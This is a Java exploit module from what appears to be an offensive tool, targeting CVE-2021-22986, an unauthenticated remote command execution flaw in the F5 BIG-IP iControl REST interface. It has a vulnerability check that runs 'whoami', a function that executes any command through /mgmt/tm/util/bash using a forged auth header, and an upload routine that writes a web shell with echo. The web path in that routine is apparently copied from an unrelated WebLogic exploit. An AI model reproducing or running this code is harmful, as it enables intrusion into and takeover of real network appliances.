package fun.fireline.others;

import com.alibaba.fastjson.JSONObject;
import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/4/3 23:20
 * @github https://github.com/yhy0
 *
 *  CVE-2021-22986 F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞
 *  未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
 */


public class CVE_2021_22986 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private  HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/mgmt/tm/util/bash";
    private static final String PAYLOAD = "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}";


    public String checkVul(String url) {
        this.target = url;

        this.headers.put("Content-type", "application/json");
        this.headers.put("X-F5-Auth-Token", "");
        this.headers.put("Authorization", "Basic YWRtaW46QVNhc1M=");

        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("commandResult")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    public String exeCmd(String cmd, String encoding){

        this.headers.put("Content-type", "application/json");
        this.headers.put("X-F5-Auth-Token", "");
        this.headers.put("Authorization", "Basic YWRtaW46QVNhc1M=");


        String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
        Response response = HttpTools.post(this.target + VULURL, payload, this.headers, "UTF-8");

        String result = response.getText();

        JSONObject object = JSONObject.parseObject(result);
        result = object.getString("commandResult");

        return result;

    }

    // 上传文件这里并没有实现
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        // 因为使用 echo 写 shell ，这里需要对 < > 转义
        String shell_info = Tools.get_escape_shell(fileContent, platform);

        String path = this.getWebPath();

        String cmd = String.format("echo %s > %s", shell_info, path + filename);
        String str = this.exeCmd(cmd, "UTF-8");

        if(this.target.endsWith("/")) {
            return this.target + "console/images/" + filename;
        } else {
            return this.target + "/console/images/" + filename;
        }

    }

    public String getWebPath(){
        // 根据不同的服务，查找对应的web路径

        // 这个CVE-2020-14882 我直接写死 路径 演示使用

        return "../../../wlserver/server/lib/consoleapp/webapp/images/";
    }

    public boolean isVul() {
        return this.isVul;
    }

}
